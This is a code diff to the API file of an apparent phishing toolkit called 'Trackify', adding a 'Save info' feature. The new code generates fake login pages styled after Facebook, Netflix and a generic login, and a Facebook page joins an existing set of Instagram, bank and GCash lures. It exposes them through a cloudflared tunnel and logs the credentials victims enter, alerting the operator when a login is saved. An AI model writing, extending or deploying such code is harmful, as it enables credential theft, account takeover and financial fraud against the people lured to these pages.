@@ -10,7 +10,7 @@ require_once __DIR__ . '/access.php';
 trackify_enforce_ip_whitelist($_SERVER, true);
 
 $action = $_GET['action'] ?? '';
-$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'telegram_config', 'telegram_test', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup'];
+$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'telegram_config', 'telegram_test', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup', 'saved_info', 'clear_saved_info', 'saveinfo_start', 'saveinfo_link', 'saveinfo_update_payload', 'saveinfo_templates'];
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     header('Content-Type: application/json');
@@ -94,6 +94,24 @@ switch ($action) {
     case 'ip_lookup':
         handleIpLookup();
         break;
+    case 'saved_info':
+        handleSavedInfo();
+        break;
+    case 'clear_saved_info':
+        handleClearSavedInfo();
+        break;
+    case 'saveinfo_start':
+        handleSaveinfoStart();
+        break;
+    case 'saveinfo_link':
+        handleSaveinfoLink();
+        break;
+    case 'saveinfo_update_payload':
+        handleSaveinfoUpdatePayload();
+        break;
+    case 'saveinfo_templates':
+        handleSaveinfoTemplates();
+        break;
     default:
         echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
 }
@@ -101,6 +119,110 @@ switch ($action) {
 function dashboard_session_user_id(): int
 {
     return (int) ($_SESSION['user_id'] ?? 0);
+}
+
+function read_saveinfo_config(string $baseDir): array
+{
+    $defaults = [
+        'template' => 'facebook',
+        'tracker_token' => '',
+        'user_id' => 0,
+    ];
+    $path = $baseDir . '/saveinfo_config.json';
+    if (!file_exists($path)) {
+        return $defaults;
+    }
+    $merged = array_merge($defaults, json_decode((string) file_get_contents($path), true) ?: []);
+    unset($merged['yt_video_id']);
+    $merged['template'] = normalize_saveinfo_template_slug($baseDir, $merged['template'] ?? 'facebook');
+
+    return $merged;
+}
+
+/**
+ * Save info HTML sources under saveinfo-templates/ (not Trackify templates).
+ *
+ * @return array<string, array{label: string, file: string}>
+ */
+function saveinfo_templates_registry(): array
+{
+    return [
+        'facebook' => ['label' => 'Facebook style', 'file' => 'facebook.html'],
+        'netflix' => ['label' => 'Netflix style', 'file' => 'netflix.html'],
+        'simple' => ['label' => 'Simple login', 'file' => 'simple.html'],
+    ];
+}
+
+function normalize_saveinfo_template_slug(string $baseDir, $raw): string
+{
+    $registry = saveinfo_templates_registry();
+    $keys = array_keys($registry);
+    $default = $keys[0] ?? 'facebook';
+    $v = strtolower(trim((string) $raw));
+    if ($v !== '' && isset($registry[$v])) {
+        return $v;
+    }
+    // Legacy numeric Trackify template ids → default Save info template
+    if ($v !== '' && ctype_digit($v)) {
+        return $default;
+    }
+
+    return $default;
+}
+
+function handleSaveinfoTemplates(): void
+{
+    global $baseDir;
+
+    $dir = $baseDir . '/saveinfo-templates';
+    $list = [];
+    foreach (saveinfo_templates_registry() as $slug => $meta) {
+        $path = $dir . '/' . $meta['file'];
+        $list[] = [
+            'slug' => $slug,
+            'label' => $meta['label'],
+            'file' => $meta['file'],
+            'readable' => is_readable($path),
+        ];
+    }
+
+    $cfg = reconcile_saveinfo_config_for_session($baseDir, read_saveinfo_config($baseDir));
+    $activeTemplate = null;
+    if (saveinfo_config_owned_by_session($cfg) && strlen((string) ($cfg['tracker_token'] ?? '')) >= 32) {
+        $activeTemplate = normalize_saveinfo_template_slug($baseDir, $cfg['template'] ?? 'facebook');
+    }
+
+    echo json_encode([
+        'status' => 'success',
+        'templates' => $list,
+        'active_template' => $activeTemplate,
+    ]);
+}
+
+function saveinfo_config_owned_by_session(array $config): bool
+{
+    return !empty($config['user_id'])
+        && (int) $config['user_id'] === dashboard_session_user_id();
+}
+
+function reconcile_saveinfo_config_for_session(string $baseDir, array $config): array
+{
+    if (saveinfo_config_owned_by_session($config)) {
+        return $config;
+    }
+    $sessionUid = dashboard_session_user_id();
+    $token = (string) ($config['tracker_token'] ?? '');
+    if (strlen($token) < 32) {
+        return $config;
+    }
+    $owner = trackify_user_id_for_token($token);
+    if ($owner !== null && $owner === $sessionUid) {
+        $config['user_id'] = $sessionUid;
+        $path = $baseDir . '/saveinfo_config.json';
+        @file_put_contents($path, json_encode($config, JSON_PRETTY_PRINT), LOCK_EX);
+    }
+
+    return $config;
 }
 
 function read_dashboard_config(string $baseDir): array
@@ -128,7 +250,7 @@ function config_owned_by_session(array $config): bool
 function normalize_template_id($value): int
 {
     $t = (int) $value;
-    if ($t < 1 || $t > 7) {
+    if ($t < 1 || $t > 8) {
         return 2;
     }
     return $t;
@@ -813,9 +935,34 @@ function handleIpLookup(): void
     ]);
 }
 
+/**
+ * Remove quick-tunnel URL log so status/link polling does not show a dead tunnel.
+ */
+function trackify_clear_sendlink_file(string $sendlinkPath): void
+{
+    if (!is_file($sendlinkPath)) {
+        return;
+    }
+    @unlink($sendlinkPath);
+    if (is_file($sendlinkPath)) {
+        @file_put_contents($sendlinkPath, '', LOCK_EX);
+        @unlink($sendlinkPath);
+    }
+}
+
 /** @return non-empty-string|null */
 function resolve_cloudflared_binary(string $baseDir, bool $isWin): ?string
 {
+    if ($isWin) {
+        foreach (['cloudflared.exe', 'cloudflared-windows-amd64.exe'] as $name) {
+            $local = $baseDir . DIRECTORY_SEPARATOR . $name;
+            if (is_file($local)) {
+                $rp = realpath($local);
+
+                return ($rp !== false && $rp !== '') ? $rp : $local;
+            }
+        }
+    }
     $name = $isWin ? 'cloudflared.exe' : 'cloudflared';
     $local = $baseDir . DIRECTORY_SEPARATOR . $name;
     if (is_file($local)) {
@@ -904,7 +1051,7 @@ function handleStart(): void
     }
 
     $sendlink = $baseDir . '/sendlink';
-    @unlink($sendlink);
+    trackify_clear_sendlink_file($sendlink);
 
     $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
     $binary = resolve_cloudflared_binary($baseDir, $isWin);
@@ -950,7 +1097,8 @@ function handleStop(): void
     global $baseDir;
 
     $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
-    if (!config_owned_by_session($config)) {
+    $saveinfoCfg = reconcile_saveinfo_config_for_session($baseDir, read_saveinfo_config($baseDir));
+    if (!config_owned_by_session($config) && !saveinfo_config_owned_by_session($saveinfoCfg)) {
         echo json_encode([
             'status' => 'error',
             'message' => 'Tunnel was started by another account or is not active for you.',
@@ -962,14 +1110,14 @@ function handleStop(): void
     $stopped = [];
 
     if ($isWin) {
-        @exec('taskkill /F /IM cloudflared.exe 2>nul', $out, $code);
-        if ($code === 0) {
-            $stopped[] = 'cloudflared';
+        $winImages = ['cloudflared.exe', 'cloudflared-windows-amd64.exe', 'ngrok.exe'];
+        foreach ($winImages as $im) {
+            @exec('taskkill /F /IM ' . escapeshellarg($im) . ' 2>nul', $out, $code);
+            if ($code === 0) {
+                $stopped[] = $im;
+            }
         }
-        @exec('taskkill /F /IM ngrok.exe 2>nul', $out, $code);
-        if ($code === 0) {
-            $stopped[] = 'ngrok';
-        }
+        usleep(250000);
     } else {
         @exec('pkill -f cloudflared 2>/dev/null', $out, $code);
         if ($code === 0) {
@@ -984,9 +1132,7 @@ function handleStop(): void
     }
 
     $sendlink = $baseDir . '/sendlink';
-    if (file_exists($sendlink)) {
-        @unlink($sendlink);
-    }
+    trackify_clear_sendlink_file($sendlink);
 
     echo json_encode([
         'status' => 'success',
@@ -1062,6 +1208,7 @@ function handleLink(): void
         $builtTemplate = $gen['template_id'];
         $payloadStamp = $gen['stamp'];
         $trapFile = $gen['trap_file'] ?? null;
+        maybe_regenerate_saveinfo_payload($baseDir, $link);
     }
 
     $excerpt = ($link === null) ? tunnel_sendlink_excerpt($sendlink) : null;
@@ -1148,6 +1295,7 @@ function generatePayload(string $link, $template, $ytVideoId, string $trackerTok
         5 => 'Instagram.html',
         6 => 'Bank.html',
         7 => 'GCash.html',
+        8 => 'Facebook.html',
     ];
 
     $templateFile = $templates[$template];
@@ -1209,13 +1357,306 @@ function generatePayload(string $link, $template, $ytVideoId, string $trackerTok
     return ['ok' => $written, 'template_id' => $template, 'stamp' => $stamp, 'trap_file' => 'trap-' . $tplId . '.html'];
 }
 
+/**
+ * Save info flow: saveinfo-templates/*.html → saveinfo_entry.php + saveinfo-trap-{slug}.html.
+ *
+ * @return array{ok: bool, template_slug: string, stamp: string, trap_file: string}
+ */
+function generateSaveInfoPayload(string $link, string $templateSlug, string $trackerToken): array
+{
+    global $baseDir;
+
+    $slug = normalize_saveinfo_template_slug($baseDir, $templateSlug);
+    $registry = saveinfo_templates_registry();
+    $relFile = $registry[$slug]['file'];
+    $templatePath = $baseDir . '/saveinfo-templates/' . $relFile;
+
+    $stamp = bin2hex(random_bytes(6)) . '-si-' . $slug . '-' . (string) time();
+
+    if (!is_readable($templatePath)) {
+        return ['ok' => false, 'template_slug' => $slug, 'stamp' => $stamp, 'trap_file' => ''];
+    }
+
+    $htmlContent = file_get_contents($templatePath);
+    if ($htmlContent === false || $htmlContent === '') {
+        return ['ok' => false, 'template_slug' => $slug, 'stamp' => $stamp, 'trap_file' => ''];
+    }
+
+    $entryTplPath = $baseDir . '/saveinfo_template.php';
+    $entryTpl = file_get_contents($entryTplPath);
+    if ($entryTpl === false || $entryTpl === '') {
+        return ['ok' => false, 'template_slug' => $slug, 'stamp' => $stamp, 'trap_file' => ''];
+    }
+
+    $entryPhp = str_replace(
+        ['forwarding_link', '__TRACKIFY_TID__', '__TRACKIFY_PF__', '__TPLSLUG__'],
+        [rtrim($link, '/'), $trackerToken, rawurlencode($stamp), $slug],
+        $entryTpl
+    );
+    if (@file_put_contents($baseDir . '/saveinfo_entry.php', $entryPhp, LOCK_EX) === false) {
+        return ['ok' => false, 'template_slug' => $slug, 'stamp' => $stamp, 'trap_file' => ''];
+    }
+
+    $htmlContent = str_replace(['forwarding_link', '__TRACKIFY_TID__'], [$link, $trackerToken], $htmlContent);
+
+    $baseUrlLine = "var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');";
+    $htmlContent = str_replace($baseUrlLine, "var BASE_URL = window.location.origin + '/';", $htmlContent);
+
+    $metaNoCache = '<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">' . "\n"
+        . '<meta http-equiv="Pragma" content="no-cache">' . "\n";
+
+    if (preg_match('/<head\b[^>]*>/i', $htmlContent)) {
+        $htmlContent = preg_replace('/<head\b[^>]*>/i', '$0' . $metaNoCache, $htmlContent, 1);
+    }
+
+    if (preg_match('/<body\b/i', $htmlContent)) {
+        $inject = '<script>window.TRACKIFY_TID=' . json_encode($trackerToken, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';
+        $htmlContent = preg_replace('/<body\b[^>]*>/i', '$0' . $inject, $htmlContent, 1);
+    }
+
+    $trapPath = $baseDir . '/saveinfo-trap-' . $slug . '.html';
+    $written = @file_put_contents($trapPath, $htmlContent, LOCK_EX) !== false;
+    $trapFile = 'saveinfo-trap-' . $slug . '.html';
+
+    return ['ok' => $written, 'template_slug' => $slug, 'stamp' => $stamp, 'trap_file' => $trapFile];
+}
+
+function maybe_regenerate_saveinfo_payload(string $baseDir, string $tunnelBase): void
+{
+    $path = $baseDir . '/saveinfo_config.json';
+    if (!is_readable($path)) {
+        return;
+    }
+    $cfg = json_decode((string) file_get_contents($path), true) ?: [];
+    $cfg = reconcile_saveinfo_config_for_session($baseDir, $cfg);
+    if (!saveinfo_config_owned_by_session($cfg)) {
+        return;
+    }
+    $token = (string) ($cfg['tracker_token'] ?? '');
+    if (strlen($token) < 32) {
+        return;
+    }
+    $slug = normalize_saveinfo_template_slug($baseDir, $cfg['template'] ?? 'facebook');
+    generateSaveInfoPayload($tunnelBase, $slug, $token);
+}
+
+function handleSaveinfoStart(): void
+{
+    global $baseDir;
+
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+
+        return;
+    }
+
+    $userId = dashboard_session_user_id();
+    $token = trackify_issue_tracker_token($userId);
+    if ($token === null) {
+        echo json_encode([
+            'status' => 'error',
+            'message' => 'Could not create tracker token. Run schema.sql (tracker_tokens) and check MySQL.',
+        ]);
+
+        return;
+    }
+
+    $templateSlug = normalize_saveinfo_template_slug($baseDir, $_POST['template'] ?? 'facebook');
+
+    $cfgPath = $baseDir . '/saveinfo_config.json';
+    $cfgPayload = json_encode([
+        'template' => $templateSlug,
+        'tracker_token' => $token,
+        'user_id' => $userId,
+    ], JSON_PRETTY_PRINT);
+    if (@file_put_contents($cfgPath, $cfgPayload, LOCK_EX) === false) {
+        echo json_encode([
+            'status' => 'error',
+            'message' => 'Cannot write saveinfo_config.json. Fix permissions on the project root.',
+        ]);
+
+        return;
+    }
+
+    $sendlink = $baseDir . '/sendlink';
+    $existing = extract_trycloudflare_url($sendlink);
+
+    if ($existing !== null) {
+        $gen = generateSaveInfoPayload($existing, $templateSlug, $token);
+        $url = rtrim($existing, '/') . '/saveinfo_entry.php';
+
+        echo json_encode([
+            'status' => 'ready',
+            'reused_tunnel' => true,
+            'link' => $url,
+            'payload_ok' => $gen['ok'],
+            'template_slug' => $gen['template_slug'],
+            'trap_file' => $gen['trap_file'] ?? null,
+            'message' => 'Using existing tunnel; Save info URL is ready.',
+        ]);
+
+        return;
+    }
+
+    trackify_clear_sendlink_file($sendlink);
+
+    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+    $binary = resolve_cloudflared_binary($baseDir, $isWin);
+    if ($binary === null) {
+        echo json_encode([
+            'status' => 'error',
+            'message' => 'cloudflared is not installed or not in PATH. Place cloudflared' . ($isWin ? '.exe' : '') . ' in the project folder.',
+        ]);
+
+        return;
+    }
+
+    $origin = tunnel_origin_url();
+    $cmd = escapeshellarg($binary) . ' tunnel --url ' . escapeshellarg($origin);
+
+    if ($isWin) {
+        $winBase = str_replace('/', '\\', $baseDir);
+        $cd = strpos($winBase, ' ') !== false
+            ? 'cd /d "' . str_replace('"', '""', $winBase) . '"'
+            : 'cd /d ' . $winBase;
+        $fullCmd = 'start /B cmd /c "' . $cd . ' && ' . $cmd . ' > sendlink 2>&1"';
+        pclose(popen($fullCmd, 'r'));
+    } else {
+        if (!function_exists('exec')) {
+            echo json_encode([
+                'status' => 'error',
+                'message' => 'PHP exec() is disabled; cannot start cloudflared.',
+            ]);
+
+            return;
+        }
+        exec('cd ' . escapeshellarg($baseDir) . ' && nohup ' . $cmd . ' > sendlink 2>&1 &');
+    }
+
+    echo json_encode([
+        'status' => 'starting',
+        'message' => 'Tunnel starting... Poll /api.php?action=saveinfo_link for the Save info URL',
+    ]);
+}
+
+function handleSaveinfoLink(): void
+{
+    global $baseDir;
+
+    $config = reconcile_saveinfo_config_for_session($baseDir, read_saveinfo_config($baseDir));
+    if (!saveinfo_config_owned_by_session($config)) {
+        echo json_encode([
+            'status' => 'forbidden',
+            'link' => null,
+            'message' => 'No Save info session for your account. Click Generate on the Save info page first.',
+        ]);
+
+        return;
+    }
+
+    $token = (string) ($config['tracker_token'] ?? '');
+    if (strlen($token) < 32) {
+        echo json_encode(['status' => 'error', 'link' => null, 'message' => 'Missing tracker token; generate again.']);
+
+        return;
+    }
+
+    $sendlink = $baseDir . '/sendlink';
+    $baseTunnel = extract_trycloudflare_url($sendlink);
+
+    $payloadOk = true;
+    $builtTemplate = null;
+    $payloadStamp = null;
+    $trapFile = null;
+
+    if ($baseTunnel !== null) {
+        $slug = normalize_saveinfo_template_slug($baseDir, $config['template'] ?? 'facebook');
+        $gen = generateSaveInfoPayload($baseTunnel, $slug, $token);
+        $payloadOk = $gen['ok'];
+        $builtTemplate = $gen['template_slug'];
+        $payloadStamp = $gen['stamp'];
+        $trapFile = $gen['trap_file'] ?? null;
+    }
+
+    $fullUrl = ($baseTunnel !== null) ? (rtrim($baseTunnel, '/') . '/saveinfo_entry.php') : null;
+    $excerpt = ($baseTunnel === null) ? tunnel_sendlink_excerpt($sendlink) : null;
+
+    echo json_encode([
+        'status' => $fullUrl ? 'ready' : 'starting',
+        'link' => $fullUrl,
+        'payload_ok' => $payloadOk,
+        'template_slug' => $builtTemplate,
+        'payload_stamp' => $payloadStamp,
+        'trap_file' => $trapFile,
+        'tunnel_log_excerpt' => $excerpt,
+    ]);
+}
+
+function handleSaveinfoUpdatePayload(): void
+{
+    global $baseDir;
+
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+
+        return;
+    }
+
+    $config = reconcile_saveinfo_config_for_session($baseDir, read_saveinfo_config($baseDir));
+    if (!saveinfo_config_owned_by_session($config)) {
+        echo json_encode(['status' => 'error', 'message' => 'Generate a Save info link first.']);
+
+        return;
+    }
+
+    $token = (string) ($config['tracker_token'] ?? '');
+    if (strlen($token) < 32) {
+        echo json_encode(['status' => 'error', 'message' => 'Missing tracker token; generate again.']);
+
+        return;
+    }
+
+    $slug = normalize_saveinfo_template_slug($baseDir, $_POST['template'] ?? $config['template'] ?? 'facebook');
+
+    $config['template'] = $slug;
+    unset($config['yt_video_id']);
+
+    $cfgPath = $baseDir . '/saveinfo_config.json';
+    if (@file_put_contents($cfgPath, json_encode($config, JSON_PRETTY_PRINT), LOCK_EX) === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Cannot save saveinfo_config.json']);
+
+        return;
+    }
+
+    $sendlink = $baseDir . '/sendlink';
+    $link = extract_trycloudflare_url($sendlink);
+    $payloadOk = true;
+    $genStamp = null;
+    $trapFile = null;
+    if ($link !== null) {
+        $gen = generateSaveInfoPayload($link, $slug, $token);
+        $payloadOk = $gen['ok'];
+        $genStamp = $gen['stamp'];
+        $trapFile = $gen['trap_file'] ?? null;
+    }
+
+    echo json_encode([
+        'status' => 'success',
+        'template' => $slug,
+        'regenerated' => $link !== null,
+        'payload_ok' => $payloadOk,
+        'payload_stamp' => $genStamp,
+        'trap_file' => $trapFile,
+    ]);
+}
+
 function handleDiag(): void
 {
     global $baseDir;
 
     $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
     $traps = [];
-    for ($i = 1; $i <= 7; $i++) {
+    for ($i = 1; $i <= 8; $i++) {
         $f = $baseDir . '/trap-' . $i . '.html';
         $traps['trap-' . $i . '.html'] = file_exists($f) ? filesize($f) : -1;
     }
@@ -1580,17 +2021,60 @@ function handleClearCaptures(): void
     ]);
 }
 
+function handleSavedInfo(): void
+{
+    $uid = dashboard_session_user_id();
+    $entries = trackify_read_saved_logins($uid);
+
+    echo json_encode([
+        'status' => 'success',
+        'user_id' => $uid,
+        'entries' => $entries,
+        'max_entries' => trackify_max_saved_logins(),
+    ]);
+}
+
+function handleClearSavedInfo(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+
+        return;
+    }
+
+    $uid = dashboard_session_user_id();
+    $ok = trackify_clear_saved_logins($uid);
+
+    echo json_encode([
+        'status' => $ok ? 'success' : 'error',
+        'message' => $ok ? 'Saved login entries cleared' : 'Could not clear some files',
+    ]);
+}
+
 function handleStatus(): void
 {
     global $baseDir;
 
     $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
+    $saveinfoCfg = reconcile_saveinfo_config_for_session($baseDir, read_saveinfo_config($baseDir));
     $sendlink = $baseDir . '/sendlink';
     $hasLink = file_exists($sendlink) && filesize($sendlink) > 0;
     $link = null;
     if ($hasLink && config_owned_by_session($config)) {
         $link = extract_trycloudflare_url($sendlink);
     }
+
+    $baseTunnel = ($hasLink) ? extract_trycloudflare_url($sendlink) : null;
+    $saveinfoUrl = null;
+    if ($baseTunnel !== null && saveinfo_config_owned_by_session($saveinfoCfg)) {
+        $st = (string) ($saveinfoCfg['tracker_token'] ?? '');
+        if (strlen($st) >= 32 && is_file($baseDir . '/saveinfo_entry.php')) {
+            $saveinfoUrl = rtrim($baseTunnel, '/') . '/saveinfo_entry.php';
+        }
+    }
+
+    $showStopTunnel = $baseTunnel !== null
+        && (config_owned_by_session($config) || saveinfo_config_owned_by_session($saveinfoCfg));
 
     $telegramConfig = $baseDir . '/telegram_config.json';
     $telegramEnabled = file_exists($telegramConfig);
@@ -1599,6 +2083,8 @@ function handleStatus(): void
         'status' => 'success',
         'tunnel_active' => (bool) $link,
         'link' => $link,
+        'saveinfo_link' => $saveinfoUrl,
+        'show_stop_tunnel' => $showStopTunnel,
         'telegram_configured' => $telegramEnabled,
     ]);
 }
@@ -1629,6 +2115,16 @@ function handleTerminal(): void
     if (file_exists($photoFlag)) {
         $events[] = ['type' => 'photo', 'content' => 'Victim\'s Photo Received!'];
         @unlink($photoFlag);
+    }
+
+    $loginNotify = trackify_user_saved_info_dir($uid) . '/login_notify.txt';
+    if (file_exists($loginNotify)) {
+        $raw = @file_get_contents($loginNotify);
+        @unlink($loginNotify);
+        $lines = array_filter(array_map('trim', explode("\n", (string) $raw)));
+        foreach ($lines as $line) {
+            $events[] = ['type' => 'saved_login', 'content' => 'Login saved (UTC ' . $line . ') — see Save info'];
+        }
     }
 
     echo json_encode(['status' => 'success', 'events' => $events]);
